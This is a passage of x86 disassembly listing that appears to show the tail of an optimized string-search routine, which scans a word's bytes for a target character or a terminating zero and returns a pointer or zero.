  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
